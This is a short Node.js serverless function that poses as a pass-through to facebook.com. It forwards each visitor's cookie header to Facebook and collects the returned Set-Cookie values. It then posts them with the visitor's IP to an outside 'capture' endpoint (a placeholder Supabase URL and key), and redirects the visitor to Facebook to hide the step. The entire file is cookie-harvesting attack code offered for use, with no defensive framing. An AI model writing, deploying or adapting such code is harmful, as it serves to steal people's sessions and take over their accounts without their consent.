const fetch = require('node-fetch');

exports.handler = async function(event, context) {
  const { ip } = JSON.parse(event.body);
  try {
    const response = await fetch('https://www.facebook.com', {
      method: 'GET',
      headers: {
        'Cookie': event.headers.cookie || ''
      },
      redirect: 'manual' // Prevent auto-redirect
    });
    const cookies = response.headers.raw()['set-cookie'] || [];
    const cookieString = cookies.map(c => c.split(';')[0]).join('; ');

    // Store in Supabase (placeholder, replace with real URL/key)
    await fetch('https://your-supabase-url/functions/v1/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer your-supabase-key' },
      body: JSON.stringify({ ip, cookies: cookieString, capture_time: new Date().toISOString() })
    });

    return {
      statusCode: 302,
      headers: { Location: 'https://www.facebook.com' },
      body: ''
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};